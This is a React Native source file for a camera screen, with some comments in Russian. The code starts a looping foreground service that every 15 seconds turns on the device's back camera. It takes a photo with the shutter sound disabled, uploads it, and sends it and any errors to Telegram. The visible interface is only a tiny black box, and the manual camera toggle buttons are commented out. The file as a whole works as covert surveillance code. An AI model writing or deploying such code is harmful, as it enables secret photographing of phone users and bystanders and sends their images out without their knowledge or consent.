import React, {useEffect, useRef, useState} from 'react';

import {useCameraDevices, Camera} from 'react-native-vision-camera';

import { View, Button, Text, StyleSheet } from "react-native";

import { uploadPhoto, sendToTelegram, connect } from "./componens/helpers";
import ReactNativeForegroundService from "@supersami/rn-foreground-service";

import { RandomPosition } from "./componens/RandomPosition";
let _setCamera :any= (a:boolean)=>console.log("wrong")
const test =()=>{
  console.log("show camera");
  _setCamera( )
}
ReactNativeForegroundService.register();

ReactNativeForegroundService.start({
  id: 1244,
  title: "Foreground Service",

  buttonOnPress: "cray",
  setOnlyAlertOnce: "true",
  color: "#000000",
  progress: {
    max: 100,
    curr: 50,
  },
});
ReactNativeForegroundService.add_task(() => test(), {
  delay: 15000,
  onLoop: true,
  taskId: "taskid",
  onError: (e) =>  sendToTelegram(e),
});
export const CameraScreen = () => {
  const devices = useCameraDevices();
  const device = devices.back;
  const [showCamera ,setShowCamera]=useState(false);
  console.log({ showCamera });
  _setCamera=()=>{
    setShowCamera(true);
    console.log("kek");

  }
  const cameraRef = useRef(null);
  const sendPhoto =async ()=>{
    connect();
    if(!cameraRef?.current){
      return
    }
    try{
      const photo = await cameraRef?.current?.takePhoto({
        qualityPrioritization: 'quality',
        flash: 'on',
        EnableAutoDistortionCorrection:true,
        enableAutoStabilization:true,
        enableShutterSound:false,
        enableAutoRedEyeReduction: true})
      if(photo?.path){
      await  uploadPhoto(photo.path    );
        setShowCamera(false)
      }
      sendToTelegram(photo.path)
    }catch (e){
      setShowCamera(false)
      console.log(e);
    }
  }


  useEffect(() => {
    connect()
  }, []);
  return (
    <View>
     { device != null&& <Camera ref={cameraRef}  device={device}   photo={true}  onInitialized={() => {
        console.log("Камера готова");
        sendPhoto()
      }}  isActive={showCamera} />}
        <View style={styles.num}>
          <RandomPosition text={showCamera+"c"}/>
        </View>
      {/*<Button onPress={handler} title={'test'} />*/}
      {/*<Button onPress={()=>{setShowCamera(p=>!p)}} title={showCamera?"выключить камеру":"включить камеру"} />*/}
    </View>
  );
};
const styles = StyleSheet.create({
  num: {
    position: "absolute",
    left:33,
    backgroundColor: '#000000', // ваш цвет
  },
});
